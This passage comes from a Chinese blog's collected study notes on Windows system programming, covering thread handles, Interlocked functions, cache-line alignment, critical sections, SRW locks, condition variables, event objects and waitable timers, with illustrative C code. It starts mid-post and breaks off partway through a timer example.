c++运行库还维护了同步对象，例如两个线程同时调用malloc堆就会损坏。需要进行线程同步控制访问。 oops错误的调用了CreateThread如果在CreateThread创建的线程中调用C++标准库函数会发生什么呢？ C++运行库会通过TlsGetValue尝试获取_tiddata块，返回NULL。 这时C++库函数会为主调线程初始化并分配一个_tiddata块。 然后这个块会与线程关联。以后运行的任何C++库函数都可以使用这个块。 但是！若线程使用了signal函数，整个进程都会终止，因为没有准备SHE帧。 另外如果不是通过_endthreadex来终止线程，数据块就无法被正常销毁，从而导致内存泄漏。 （说明 在标准C++的DLL库中如果线程终止会收到一个DLL_THREAD_DETACH通知，会释放线程相关的_tiddata块。但还是建议用_beginthreadex来创建线程，而不要用CreateThread） 不应该调用的C/C++运行期函数12345_CRTIMP uintptr_t __cdecl _beginthread ( void (__cdecl * initialcode) (void *), unsigned stacksize, void * argument ); 这个函数比较老，不能创建具有安全属性的线程，不能创建让线程立即挂起，也不能获得线程ID值。_endthread也类似，他是无参数的。 _endthread会在调用ExitThread前，调用CloseHandle。 然后此时hThread可能已经无效了会调用失败。 新的_endthreadex不会关闭线程的句柄。 对自己的ID概念应该有所了解windows提供了一些函数来方便线程引用他自己的进程内核对象或者他的线程内核对象。 HANDLE GetCurrentProcess(); HANDLE GetCurrentThread(); 他们返回的是主调线程的进程内核对象的伪句柄。（不会在主调进程的句柄表中创建新的句柄，而且不会影响实际内核对象的引用计数器。所以也不需要CloseHandle） 应用 一个线程可以查询其所在进程的使用时间 123FILETIME ftCreateionTime, ftExitTime, ftKernelTime, ftUserTime;GetProcessTimes(GetCurrentProcess(), &amp;ftCreateionTime, &amp;ftExitTime, &amp;ftKernelTime, &amp;ftUserTime); 类似的也有GetThreadTimes一个线程可以查询自己的线程时间。 123FILETIME ftCreateionTime, ftExitTime, ftKernelTime, ftUserTime;GetThreadTimes(GetCurrentThread(), &amp;ftCreateionTime, &amp;ftExitTime, &amp;ftKernelTime, &amp;ftUserTime); 一下函数能获得进程或线程的操作系统级别的唯一ID DWORD GetCurrentProcessId(); DWORD GetCurrentThreadId(); 将伪句柄转换为真实句柄 有时候确实需要真实的句柄值。可以采用DuplicateHandle转换为真实句柄。 例如父线程创建子线程并传递自己的线程句柄被子线程调用。 一个错误传递线程句柄的例子 12345678910111213141516DWORD WINAPI ChildThread(PVOID pvParam) { HANDLE hThreadParent = (HANDLE)pvParam; FILETIME ftCreateionTime, ftExitTime, ftKernelTime, ftUserTime; GetThreadTimes(hThreadParent, &amp;ftCreateionTime, &amp;ftExitTime, &amp;ftKernelTime, &amp;ftUserTime); //.. return 0;} DWORD WINAPI ParentThread(PVOID pvParam) { HANDLE hThreadParent = GetCurrentThread(); CreateThread(NULL, 0, ChildThread, (PVOID)hThreadParent, 0, NULL); //... return 0;} 采用DuplicateHandle修改后的父线程代码 1234567891011121314151617181920212223242526272829303132DWORD WINAPI ChildThread(PVOID pvParam) { HANDLE hThreadParent = (HANDLE)pvParam; FILETIME ftCreateionTime, ftExitTime, ftKernelTime, ftUserTime; GetThreadTimes(hThreadParent, &amp;ftCreateionTime, &amp;ftExitTime, &amp;ftKernelTime, &amp;ftUserTime); //.. CloseHandle(hThreadParent); return 0;} DWORD WINAPI ParentThread(PVOID pvParam) { HANDLE hThreadParent; DuplicateHandle( GetCurrentProcess, // Handle of process that thread // pseudohandle is relative to GetCurrentThread(), // Parent thread's pseudohandle GetCurrentProcess(), // Handle of process that the new, real, // thread is relative to &amp;hThreadParent, // Will receive the new, real, handle // identifying the parent thread 0, // Ignored due to DUPLICATE_SAME_ACCESS FALSE, // New thread handle is not inheritable DUPLICATE_SAME_ACCESS // New thread handle has same access as pseudohandle, ); CreateThread(NULL, 0, ChildThread, (PVOID)hThreadParent, 0, NULL); //... return 0;} 这样就会复制了一个真正的内核对象的句柄的记录，并且递增实际内核对象数据结构的引用计数器。 在子线程使用完次内核对象句柄，需要调用CloseHandle。 DuplicateHandle也可以把进程的伪句柄转换成真实的句柄对象。 123456789101112131415HANDLE hProcess;DuplicateHandle( GetCurrentProcess, // Handle of process that thread // pseudohandle is relative to GetCurrentProcess(), // Process's pseudohandle GetCurrentProcess(), // Handle of process that the new, real, // thread is relative to &amp;hProcess, // Will receive the new, real, handle // identifying the parent thread 0, // Ignored due to DUPLICATE_SAME_ACCESS FALSE, // New thread handle is not inheritable DUPLICATE_SAME_ACCESS // New thread handle has same access as pseudohandle, );","link":"/2019/08/28/Windows-Kernel-6/"},{"title":"Windows-Kernel-8","text":"用户方式中线程的同步 线程很少能够在所有的时间都独立地进行操作，所以需要生成一些线程来处理某些任务。 系统中的线程必须拥有对各个系统资源的访问，这些资源包括堆栈、串口、文件，窗口和其他资源。 线程需要在下面两种情况下进行通信： 当有多个线程访问共享资源而不使资源被破坏时 当以恶搞线程需要将某个任务也已经完成的情况通知另外一个或多个线程时 原子访问：互锁的函数家族线程同步问题在很多程序上与原子访问有关，所谓的原子访问，是指线程在访问资源时能确保所有其他线程都不在同一时间内访问相同的资源。 123456789101112long g_x = 0;DWORD WINAPI ThreadFuncl(PVOID pvParam){ g_x++; return (0);}DOWRD WINAPI ThreadFunc2(PVOID pvParam){ g_x++; return (0);} 假设ThreadFuncl和ThreadFunc2是两个线程，并且两个线程都处于运行中，当两个线程停止运行，结果并不会是2； Windows是抢占式操作系统，你根本无法预料在这个线程执行的过程中，中断在哪里或者同时有多少个线程在执行，所以在上面两个函数都退出以后，它的结果很有可能是1； 为了解决上面的问题，Windows给出了一个函数：InterlockedExchangeAdd 1234long InterlockedExchangeAdd ( PLONG plAddend, LONG lIncrement); 这个函数的参数调用：传递一个长变量地址，并指明将这个值传递多少即可，将上面的代码重用： 123456789101112long g_x = 0;DWORD WINAPI ThreadFuncl(PVOID pvParam){ InterlockedExchangeAdd(&amp;g_x,1); return (0);}DOWRD WINAPI ThreadFunc2(PVOID pvParam){ InterlockedExchangeAdd(&amp;g_x,1); return (0);} 所有的线程都应该设法通过调用这些函数来修改共享的变常量，任何线程都不应该通过调用简单的c语言来修改共享的变量 互锁函数的运行方式：取决于运行的是何种CPU平台。 x86家族： 互相函数发出硬件信号，防止另一个CPU访问同一个内存地址 Alpha平台： 打开CPU中的一个特殊的位标志，并注明被访问的内存地址。 将内存的值读入一个寄存器 修改该寄存器 如果CPU中的特殊位标志是关闭的，则转入第二步，否则，特殊位标志仍然是打开的，寄存器的值重新载入内存。 Interlocked函数是如何工作的？ 这取决于代码运行的CPU平台。如果是x86系列cpu，Interlocked函数会在总线上维持一个硬件信号，该信号会阻止其他CPU访问一个内存地址。另外传递给该函数的变量 必须是经过地址对齐的，否则可能会失败。 如果需要使用InterlockedExchangeAdd加一个负数值就可以 当需要实现一个循环的时候，InterlockedExchange是非常有用的： 12345678BOOL g_fResourceInuser = FALSE;void Func1(){ while(InterlockedExchange(&amp;g_fResourceInuser,TRUE) == TRUE) Sleep(0); InterlockedExchanged(&amp;g_fResourceInuser,FALSE);} 循环锁在多处理器计算机使用，因为当一个线程循环运行的时候，另外一个线程在另一个CPU上运行 互锁函数： 123456789101112PVOID InterlockedCompareExchange( PLONG plDestination, LONG lExchange, LONG lComparand);PVOID InterlockedCompareExchangePointer( PVOID* ppvDestination, PVOID pvExchange, PVOID pvComparand); 这两个函数负责执行一个原子测试和设置操作。如果是32位应用程序，那么两个函数都在32位值上运行，但是，如果是64位应用程序，InterlockedCompareExchange函数在32位值上运行，而InterlockedCompareExchangePointer函数的值则在64位上运行。 伪代码： 1234567891011LONG InterlockedCompareExchange(PLONG plDestination, LONG lExchange,LONG lComparand){ LONG lRet = *plDestination; if(*plDestination == lComparand) { *plDestination = lExchange; } return (lRet);} 函数将Destination的值和Comparand比较。如果相同，则将Destination修改exchange。 如果Destination的值不等于Comparand，则值不变。函数返回原来的pDestination值。所有这些操作都是以原子方式进行的。 还有64位版本，用来处理已对齐的64位值。 另外多个进程需要读一个共享内存段，也可以使用Interlocked函数。LONG InterlockedIncrement(PLONG plAddend); LONG InterlockedDecrement(PLONG plAddend); 还有一些列基于InterlockedCompareExchange64的OR， AND和XOR函数 函数 描述 InitializeSListHead 创建一个空栈 InterlockedPushEntrySList 在栈顶添加一个元素 InterlockedPopentrySList 移除位于栈顶的元素并将它返回 InterlockedFlushSlist 清空栈 QueryDepthSlist 返回栈中元素的数量 高速缓存行当一个CPU从内存读取一个字节时，它不只是去处一个字节，它要取出组后的字节来填入高速缓存行。告诉缓存行由32或64字节组成，并且始终在第32或64字节的边界上对齐。 如果想为装配有多个处理器的机器构建高性能的应用程序，应该注意高速缓存行。 CPU读取数据的时候并不是直接从内存中取回，而是取回一个高速缓存行。（根据CPU不同可能是32字节，64甚至128字节） ​ 2 .他们始终都对齐到32字节的边界（也可能是64,128字节）其目的是为了提高性能。 一般程序会对一组相邻的字节操作。如果所有字节都在高速缓存行中，那么CPU不会访问内存总线（后者消耗的时间高于前者）。 在多处理器环境中，高速缓存行使得内存更新困难： CPU1读取一个字节，使该字节和它的相邻字节读入CPU1的高速缓存行 CPU2读取同一个字节，使得第一步中的相同的各个字节读入CPU2的高速缓存行 CPU1修改内存中的该字节，使得该字节被写入CPU1的高速缓存行，但是信息尚未写入RAM（内存） CPU2再次读取同一个字节。由于该字节已经放入CPU2的高速缓存行，因此它不必访问内存。但是CPU2将看不到内存中该字节的新值。 为了解决这个问题，芯片设计者制定了一个规则。当一个 CPU 修改高速缓存行中的字节时，计算机中的其它 CPU 会被通知，它们的高速缓存将视为无效。于是，在上面的情况下， CPU2 发现自己的高速缓存中数据已无效， CPU1 将立即把自己的数据写回 RAM ，然后 CPU2 重新读取该数据。 可以看出，高速缓存行在多处理器上会导致一些不利。 设计很差的数据结构的例子： 123456struct CUSTINFO { DWORD dwCustomerID; // Mostly read-only int nBalanceDue; // REad-write wchar_t szName[100]; // Mostly read-only FILETIME ftLastOrderDate; // Read-write}; 改进版： 1234567891011121314151617181920212223#ifdef _X86_#define CACHE_ALIGN 32#endif#ifdef _ALPHA_#define CACHE_ALIGN 64#endif#ifdef _IA64_#define CACHE_ALIGN ??#endif#define CACHE_PAD(Name,ByteSoFar) BYTE Name[CACHE_ALIGN - ((BytesSoFar) % CACHE_ALIGN)]struct CUSTINFO{ DWORD dwCustomerID; char szName[100]; CACHE_PAD(bPadl,szieof(DWORD)+100); int nBalanceDue; FILETIME stLastOrderDate; CACHE_PAD(bPad2,sizeof(int)+sizeof(FILETIME));}; 要确定CPU的高速缓存行的大小，可以调用Win32的GetLogicalProcessorInformation 1234567WINBASEAPIBOOLWINAPIGetLogicalProcessorInformation( _Out_writes_bytes_to_opt_(*ReturnedLength, *ReturnedLength) PSYSTEM_LOGICAL_PROCESSOR_INFORMATION Buffer, _Inout_ PDWORD ReturnedLength ); 该函数会返回一个SYSTEM_LOGICAL_PROCESSOR_INFORMATION结构数组。检查其Cache字段，该成员是一个CACHE_DESCRIPTOR的结构。其中的LineSize就是CPU高速缓存的大小。 有了该信息可以使用C/C++编译器的__declspec(align(#))来只是对字段对其加以控制。以下是经过对其以后的数据额结构定义 123456789101112#define CACHE_ALIGN 64 // Force each structure to be in a different cache line.struct __declspec(align(CACHE_ALIGN)) CUSTINFO { DWORD dwCustomerID; // Mostly read-only wchar_t szName[100]; // Mostly read-only // Force the following members to be in a different cache line. __declspec(align(CACHE_ALIGN)) int nBalanceDue; // Read-write FILETIME ftLastOrderDate; // read-write}; 最好是只让一个线程访问数据（函数参数和局部变量是最简单的方法） 或者只让一个CPU访问数据 高级线程同步旋转锁虽然对执行效率高，但是浪费cpu时间。尤其在单cpu上应该避免使用旋转锁。 需要一种机制能让线程等待共享资源的访问权，又不会浪费cpu时间。 调用一种操作系统函数将线程需要访问的资源或者需要等待的某种事件，传递给操作系统。线程自身将挂起。 操作系统代理线程去检测目标资源是否可以使用，或者特殊事件是否已经发生了。（在这个过程中线程本身不会被调度，一直处于等待状态）。 需要避免使用的一种方法 如果没有同步对象，并且操作系统不能发现各种特殊事件，那么线程就不得不使用下面要介绍的一种方法使自己与特殊事件保持同步。 运用这种方法时，一个线程能够自己与另一个线程中的任务的完成实现同步，方法是不断查询多个线程共享或可以访问的变量的状态。下面的代码段说明了这个情况： 123456789101112131415161718192021volatile BOOL g_fFnishedCalculation = FALSE; DWORD WINAPI RecalcFunc(PVOID pvParam) { // Perform the recalculation. //.. g_fFnishedCalculation = TRUE; return 0;} int _tmain(int argc, TCHAR* argv[], TCHAR * env[]){ CreateThread(..., RecalcFunc, ...); //创建线程 //... // Wait for the recalculation to complete. while (!g_fFnishedCalculation) //非假即真 ; //... return 0;} BOOL变量g_f FinishedCalculation从来没有被设置为TRUE。当主线程的优先级高于执行 RecalcFunc函数的线程时，就会发生这种情况。在这种情况下，系统决不会将任何时间片分配给 RecalcFunc线程。 关键代码段关键代码段指的是一个小代码段，在代码能够执行前，它必须独占对某些共享资源的访问权 在当前线程离开临界区之前，系统是不会去调度任何想要访问同一资源的其他线程的。当前系统仍然可以暂停当前线程去调度其他线程。 当拥有一项可供多个线程访问的资源时，应该创建一个CRITICAL_SECTION结构 编写的需要使用共享资源的任何代码都必须封装在E n t e r C r i t i c a l S e c t i o n和L e a v e C r i t i c a l S e c t i o n函数中。如果忘记将代码封装在一个位置，共享资源就可能遭到破坏。例如，如果我删除了F r i s t T h r e a d线程对E n t e r C r i t i c a l S e c t i o n和L e a v e C r i t i c a l S e c t i o n的调用， g _ n I n d e x和g _ d w Ti m e s变量就会遭到破坏。即使S e c o n d T h r e a d线程仍然正确地调用E n t e r C r i t i c a l S e c ti o n和L e a v e C r i t i c a l S e c t i o n，也会出现这种情况。忘记调用E n t e r C r i t i c a l S e c t i o n和L e a v e C r i t i c a l S e c t i o n函数就像是不请求允许进入厕所。线程只是想努力挤入厕所并对资源进行操作。可以想象，只要有一个线程表现出这种相当粗暴的行为，资源就会遭到破坏。 临界区内部也使用了Interlock系的旋转锁，执行速度非常快。临界区的缺点在于无法在多个进程之间的线程进行同步。 关键代码段准确的描述1234567891011121314typedef struct _RTL_CRITICAL_SECTION { PRTL_CRITICAL_SECTION_DEBUG DebugInfo; // // The following three fields control entering and exiting the critical // section for the resource // LONG LockCount; LONG RecursionCount; HANDLE OwningThread; // from the thread's ClientId-&gt;UniqueThread HANDLE LockSemaphore; ULONG_PTR SpinCount; // force size on 64-bit systems when packed} RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION; 使用CRITICAL_SECTION 应该用WindowsAPI来操作其成员，不要私自修改。1）所有访问资源的线程需要知道CRITICAL_SECTION结构的地址 2）任何试图访问CRITICAL_SECTION的线程，需要将CRITICAL_SECTION的内部成员初始化。 VOID InitializeCriticalSection(PCRITICAL_SECTION pcs); 当线程不再需要临界区对象来保护共享资源时， VOID DeleteCriticalSection(PCRITICAL_SECTION pcs); EnterCriticalSection 会检查结构中的成员变量，这些变量表示是否有线程正在访问资源，以及哪个线程正在访问资源。 1 )如果没有线程正在访问资源，EnterCriticalSection会更新成员变量，以表示调用线程已经获准对资源的访问，并立即返回。 2）如果成员变量表示调用线程已经获准访问资源，那么EnterCriticalSection会更新变量，以表示线程被获准访问的次数，并立即放回。这样线程可以继续执行。（多次进入） 3）如果成员变量表示有其他线程正在访问资源，那么EnterCriticalSection会使用一个事件内核对象把调用线程切换到等待状态。（调用线程被挂起，不会浪费CPU时间） 操作系统会记住这个线程想要访问的资源，一旦当前正在访问的资源线程调用了LeaveCriticalSection，系统会自动更新CRITICAL_SECTION的成员变量并将等待中的线程切换回可调度状态。 BOOL TryEnterCriticalSection（PCRITICAL_SECTION pcs）;（非阻塞） 测试当前线程是否可以访问此资源，可以返回TRUE 否则FALSE 不会被挂起等待。 若返回TRUE表示当前线程已经对次临界区对象有访问权，需要配一个LeaveCriticalSection VOID LeaveCriticalSection(PCRITICAL_SECTION pcs); 该成员会递减CRITICAL_SECTION内部成员的线程引用计数器，如果计数器递减后为0.会更新成员变量，表示没有任何线程正在访问被保护的资源。 同时会检测有没有其他线程由于调用了EnterCriticalSection而处于等待状态。 如果有一个线程处于等待，则函数会更新成员变量，把其中一个处于等待的线程切换回可调度状态。 关键代码段与循环锁Microsoft为了提高关键段的性能（因为切换到内核模式等待需要1000个CPU周期），将旋转锁也合并入关键段。 在一段时间内不断循环尝试获得自由的访问权，只有尝试失败的时候，线程才会切换到内核模式并进入等待状态。 12345678WINBASEAPI_Must_inspect_result_BOOLWINAPIInitializeCriticalSectionAndSpinCount( _Out_ LPCRITICAL_SECTION lpCriticalSection, _In_ DWORD dwSpinCount ); 第一个参数是关键段的地址， 第二个参数是希望旋转锁循环的次数。在单处理器上设置循环次数毫无用处因此会被忽略dwSpinCount。 调用以下函数改变关键段的旋转次数 1234567WINBASEAPIDWORDWINAPISetCriticalSectionSpinCount( _Inout_ LPCRITICAL_SECTION lpCriticalSection, _In_ DWORD dwSpinCount ); 同样如果主机只有一个处理器，函数会忽略dwSpinCount参数。 为了提高关键段的性能，应该同时使用旋转锁。通常保护进程堆关键段所使用的选中次数是4000. 关键代码段与错误处理在使用InitializeCriticalSection函数会分配一些内存，如果失败会抛出STATUS_NO_MEMORY异常。 使用结构化异常可以捕获这个异常。 InitializeCriticalSectionAndSpinCount也能发生这个问题，如果内存分配不成功其返回FALSE 在多个线程抢占关键段资源的时候，系统会为其创建事件内核对象（挂起等待线程），所以在不使用某一个关键段时需要调用DeleteCriticalSection系统才会释放这个事件内核对象。 在WinXP之前，内存不足的时候，EnterCriticalSection（创建事件内核对象）可能会抛出EXCEPTION_INVALID_HANDLE异常。 使用InitializeCriticalSectionAndSpinCoun（dwSpinCount的参数最高位设为1）在初始化关键段时，同时初始化事件内核对象。如果无法创建事件内核对象， 那么函数会返回FALSE。 但是总是创建事件内核对象可能会耗费系统资源。只有在以下3种情况下才必须这样 1）不允许EnterCriticalSection失败 2）线程抢占资源的情况一定会发生 3）预计进程运行会在内存不足的环境下进行。 Slim 读/写锁SRWLOCK. 区分那些想要读取资源的线程和更新资源的线程。 允许同时读取资源，但是对写入资源加以保护。 若资源被独占写入，任何其他线程，无论是读取还是写入都不允许访问资源。 SRWLOCK srwLock; 123typedef struct _RTL_SRWLOCK { PVOID Ptr; } RTL_SRWLOCK, *PRTL_SRWLOCK; 因为其指向的地址是完全未公开的。不能编写代码来访问他。 VOID InitalizeSRWLock(PSRWLOCK SRWLock); 初始化读写锁。 对于需要写入资源的线程可以调用 VOID AcquireSRWLockExclusive(PSRWLOCK SRWLock); 独占被保护资源 VOID ReleaseSRWLockExclusive(PSRWLOCK SRWLock); 释放资源的锁定 对于读取线程来说可以调用 VOID AcquireSRWLockShared(PSRWLOCK SRWLock); VOID ReleaseSRWLockShared(PSRWLOCK SRWLock); 不存在对SRWLOCK删除或销毁的函数，系统会自动进行清理工作。 和CRITICAL_SECTION比较，读写锁有几个缺点1）不存在TryEnter(Shared/Exclusive)SRWLock之类的函数，如果锁被占用，那么调用AcquireSRWLOCK（Shared/Exclusive)的线程会被阻塞。 2）不能递归获得SRWLOCK ，也就是一个线程不能为了多次写入资源而多次锁定资源。然后再多次调用ReleaseSRWLock*来释放资源的锁定。 对比不同的UserMode下的线程同步机制性能对比。 对比 Volatile Interlocked CRITICAL_SECTION SRWLock(Shared) SRWLock(Exclusive) Mutex 分别使用以上的线程同步机制在多线程的情况下对全局变量（资源）进行读写操作。 条件变量有的时候需要让线程以原子方式把锁释放并将自己阻塞，直到某一个条件成立为止。可以使用条件变量 SleepConditionVariableCS SleepConditionVariableSRW 123456789101112131415161718WINBASEAPIBOOLWINAPISleepConditionVariableCS( _Inout_ PCONDITION_VARIABLE ConditionVariable, _Inout_ PCRITICAL_SECTION CriticalSection, _In_ DWORD dwMilliseconds ); WINBASEAPIBOOLWINAPISleepConditionVariableSRW( _Inout_ PCONDITION_VARIABLE ConditionVariable, _Inout_ PSRWLOCK SRWLock, _In_ DWORD dwMilliseconds, _In_ ULONG Flags ); 参数ConditionVariable 指向一个已经初始化的条件变量，调用线程正在等待该条件变量。第二个参数是执行临界区或者SRWLock的指针，传入的锁会被释放 dwMilliseconds 用来等待的时间（也可以设定为INFINITE） 第二个函数的Flag指定一旦条件变量被触发，我们希望线程以何种方式来得到锁。对于写入线程传入0（独占资源），对于读取线程传入CONDITION_VARIABLE_LOCKMODE_SHARED 注意如果指定的时间用完，条件变量尚未触发，函数会返回FALSE，否则返回TRUE。 当返回FALSE时，线程显然并没有获得锁或临界区。 当另一个线程想要触发条件以用于唤醒等待条件的线程可以调用一下函数 12345678910111213WINBASEAPIVOIDWINAPIWakeConditionVariable( _Inout_ PCONDITION_VARIABLE ConditionVariable ); WINBASEAPIVOIDWINAPIWakeAllConditionVariable( _Inout_ PCONDITION_VARIABLE ConditionVariable ); 这样被SleepConditonVariable*的线程会被唤醒。 第一个函数只唤醒一个线程 第二个可以唤醒多个线程","link":"/2019/09/03/Windows-Kernel-8/"},{"title":"Windows-Kernel-9","text":"线程与内核对象的同步 用户模式下的线程同步高性能，但是存在一些局限。例如无法进行进程间线程的同步，Iterlocked系函数不会把线程切换到等待状态， 进入临界区无法设置最长等待时间等。 内核对象来进行线程同步，功能强大许多。但是唯一的缺点就是性能。 对于线程内核对象可能处于触发（signaled）和未触发（nosignaled） 进程内核对象，在创建时其内部有一个BOOL变量是FALSE， 单进程终止时该内核对象会变成TRUE 表示已经触发 但是这个过程是不可逆的。 以下列出可能处于未触发也可以处于触发状态的内核对象： 进程，线程，作业，文件以及控制台的标准输入流/输出流/错误流 事件，可等待的计时器， 信号量，互斥量 等待函数等待函数可使线程自愿进入等待状态，直到一个特定的内核对象变为已通知状态。 WaitForSingleObject: 1234DWORD WaitForSingleObject{ HANDLE hObject, DWORD dwMilliseconds}; 当线程调用该函数时，第一个参数hObject标识一个能够支持被通告/未通告的内核对象。 第二个参数dwMilliseconds允许该线程指明，为了等待该对象变为已通知状态，它将等待多久。 INFINITE是作为第二个参数传递给WaitForSingleObject，直到该进程终止运行。 12345678910DWORD dw = WaitForSingleObject(hProcess,5000);switch(dw){ case WAIT_OBJECT_0: break; case WAIT_TIMEOUT: break; case WAIT_FAILED: break;} WaitForSingleObject的返回值表示为什么调用线程又能继续执行了。 WaitForMultipleObjects与WaitForSingleObject函数相似，区别于允许调用线程的同时查看若干个内核对象的已通知状态： 123456DWORD WaitForMultipleObjects( DWORD dwCount, CONST HANDLE* phObjects, BOOL fWaitAll, DWORD dwMilliseconds); dwCount参数在用于指明要让函数查看的内核对象的数量。这个值介于1-64； phObjects参数是指向内核对象句柄的数组的指针； fWaitAll参数高速该函数，你想以何种方式调用，如果传递未TRUE，那么在所有对象变为已通知之前，该函数不允许调用线程运行； dwMilliseconds函数的作用是如果在等待的时候规定的时间到了，那么该函数无论如何都返回。 WaitForMultipleObjects的返回值 1234567891011121314151617181920212223242526HANDLE h[3];h[0] = hProcess1;h[1] = hProcess2;h[2] = hProcess3;DWORD dw = WaitForMultipleObjects(3, h, FALSE, 5000);switch (dw) {case WAIT_FAILED: // Bad call to function (invalid handle?) break;case WAIT_TIMEOUT: // None of the objects became signaled within 5000 milliseconds. break;case WAIT_OBJECT_0 + 0: // The process identified by h[0] (hProcess1) terminated. break;case WAIT_OBJECT_0 + 1: // The process identified by h[1] (hProcess1) terminated. break;case WAIT_OBJECT_0 + 2: // The process identified by h[2] (hProcess1) terminated. break;} 如果给bWaitAll传递TRUE那么所有内核对象都触发了以后返回值WAIT_OBJECT_0 成功等待的副作用成功的调用WaitForMultipleObjects和WaitForSingleObject，实际上会改变对象的状态。成功的调用是指函数发现对象已经得到通知并且返回一个相对于WAIT_OBJECT_0的值，如果返回WAIT_TIMEOUT或WAIT_FAILED,那么调用就没有成功，没有成功的调用，内核状态也不会有任何改变。 当一个线程调度WaitForMultipleObjects的时候，该函数能测试所有对象的通知状态，并且能够将所有必要的副作用作为一项操作来执行。 两个线程相同的方式调用WaitForMultipleObjects: 1234HANDLE h[2];h[0] = hAutoResetEvent1;h[1] = hAutoResetEvent2;WaitForMultipleObjects(2,h,TRUE,INFINITE); 两个线程相同的代码 其中一个线程的状态被修改为已通知状态，两个线程都发现，该时间已经变成了已通知，但无法唤醒，所以线程继续等待 另外一个线程的状态也已经被触发，其中一个线程检测到两个事件都触发以后，将两个线程又重新设置为非触发状态并返回 另一个线程会继续等待直到两个事件同时触发为止 WaitForMultipleObjects是以原子操做的方式工作的，当他检查内核对象的状态时，任何其他线程都不能在背后修改对象的状态。这就防止了死锁的发生。 事件内核对象事件包含一个使用计数器，一个用来标识事件是自动重置还是手动重置的布尔值，以及另一个布尔值用来表示事件有没有被触发。 当一个手动重置事件被触发的时候，正在等待该事件的所有线程都变成可调度状态。 当一个自动重置事件被触发时，只有一个正在等待该事件的线程会变成可调度状态。 事件常用于让一个线程执行初始化工作，然后再触发另一个线程，让它执行剩余的工作。 下面是CreateEvent函数，用于创建内核事件： 123456HANDLE CreateEvent( PSECURITY_ATTRIBUTES psa, BOOL fManmulReset, BOOL fInitalState, PCTSTR pszName); fManmulReset的参数是个布尔值，它高速系统创建一个人工重置（TRUE）的事件还是自动重置（FALSE）的事件。 fInitalState参数用于指明该事件是要初始化为已通知（TRUE）或未通知（FALSE）。 CreateEvent就将与进程相关的句柄返回给事件对象。 其他进程中的线程可以获得该对象的访问权，方法是使用pszName参数中传递相同的值，使用继承性 还有一个CreateEventEx函数用于创建事件。 12345678910WINBASEAPI_Ret_maybenull_HANDLEWINAPICreateEventExW( _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_opt_ LPCWSTR lpName, _In_ DWORD dwFlags, _In_ DWORD dwDesiredAccess ); dwFlags参数可以接受两个位的掩码 打开这个内核对象： 12345HANDLE OpenEvent( DWORD fdwAccess, BOOL fInherit, PCTSTR pszName); 打开一定要记得关闭，CloseHandle函数 一旦我们不需要事件内核对象的时候调用closehandlel来关闭。通过调用SetEvent可以直接控制它的状态，变成触发状态，使用ResetEvent使得事件变成未触发状态。 12BOOL SetEvent（HANDLE hEvent）； //已通知BOOL ResetEvent(HANDLE hEvent); //未通知 自动事件由于等待成功所引起的副作用的影响，当事件被线程等待以后会自动设置为非触发，因此不需要ResetEvent。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455HANDLE g_hEvent; DWORD WINAPI WordCount(PVOID pvParam) { // Wait until the file's data is in memory. WaitForSingleObject(g_hEvent, INFINITE); // Access the memory block. // ... return 0;} DWORD WINAPI SpellCheck(PVOID pvParam) { // Wait until the file's data is in memory. WaitForSingleObject(g_hEvent, INFINITE); // Access the memory block. // ... return 0;} DWORD WINAPI GrammarCheck(PVOID pvParam) { // Wait until the file's data is in memory. WaitForSingleObject(g_hEvent, INFINITE); // Access the memory block. // ... return 0;} int _tmain(int argc, TCHAR* argv[], TCHAR * env[]){ // Crate the manual-reset, nosignaled event. g_hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); // Spawn 3 new threads. HANDLE hThread[3]; DWORD dwThreadID; hThread[0] = CreateThread(NULL, 0, WordCount, NULL, 0, &amp;dwThreadID); hThread[1] = CreateThread(NULL, 0, SpellCheck, NULL, 0, &amp;dwThreadID); hThread[2] = CreateThread(NULL, 0, GrammarCheck, NULL, 0, &amp;dwThreadID); OpenFileAndReadContentsIntoMemory(...); // Allow all 3 threads to access the memory. SetEvent(g_hEvent); return 0;} 因为这里使用了手动重置事件，所以当主线程准备好数据以后3个子线程都能同时运行。 如果使用自动重置事件，那么3个子线程只会有一个能继续运行。为了让3个子线程都能执行代码，修改了一下3个子线程的代码 123456789101112131415161718192021222324252627282930313233DWORD WINAPI WordCount(PVOID pvParam) { // Wait until the file's data is in memory. WaitForSingleObject(g_hEvent, INFINITE); // Access the memory block. // ... SetEvent(g_hEvent); return 0;} DWORD WINAPI SpellCheck(PVOID pvParam) { // Wait until the file's data is in memory. WaitForSingleObject(g_hEvent, INFINITE); // Access the memory block. // ... SetEvent(g_hEvent); return 0;} DWORD WINAPI GrammarCheck(PVOID pvParam) { // Wait until the file's data is in memory. WaitForSingleObject(g_hEvent, INFINITE); // Access the memory block. // ... SetEvent(g_hEvent); return 0;} 这个3个线程都会被系统调用，而且每个线程都能独占的读写资源。 1BOOL PulseEvent(HANDLE hEvent); 将一个事件变成触发状态以后立即恢复到未触发状态。 Handshake 等待定时器内核对象可等待的计时器是这样一种内核对象：他们会在某个指定的时间触发，或每间隔一段时间触发。 创建一个可等待的计时器使用CreateWaitableTimerW 123456789WINBASEAPI_Ret_maybenull_HANDLEWINAPICreateWaitableTimerW( _In_opt_ LPSECURITY_ATTRIBUTES lpTimerAttributes, _In_ BOOL bManualReset, _In_opt_ LPCWSTR lpTimerName ); 打开一个可等待的计数器 OpenWaitableTimerW 123456789WINBASEAPI_Ret_maybenull_HANDLEWINAPIOpenWaitableTimerW( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ LPCWSTR lpTimerName ); bManualReset表示要创建的是手动重置还是自动重置的计时器。 手动重置，等待该计时器的所有线程都变成可调度状态 自动重置，只有一个等待该计时器的线程会变成可调度状态 调用SetWaitableTimer设置计时器，能让其触发 1234567891011WINBASEAPIBOOLWINAPISetWaitableTimer( _In_ HANDLE hTimer, _In_ const LARGE_INTEGER * lpDueTime, _In_ LONG lPeriod, _In_opt_ PTIMERAPCROUTINE pfnCompletionRoutine, _In_opt_ LPVOID lpArgToCompletionRoutine, _In_ BOOL fResume ); Timer ：计时器内核对象句柄 pDueTime ： 计时器第一次触发的时间应该在什么时候 lPeriod：计时器在第一次触发以后应该以怎样的频度触发。 例如以下代码把计时器第一次触发时间设为2019年9月3日下午6:00，以后每间隔6小时触发一次： 123456789101112131415161718192021222324252627282930// Declare our local variables.HANDLE hTimer;SYSTEMTIME st;FILETIME ftLocal, ftUTC;LARGE_INTEGER 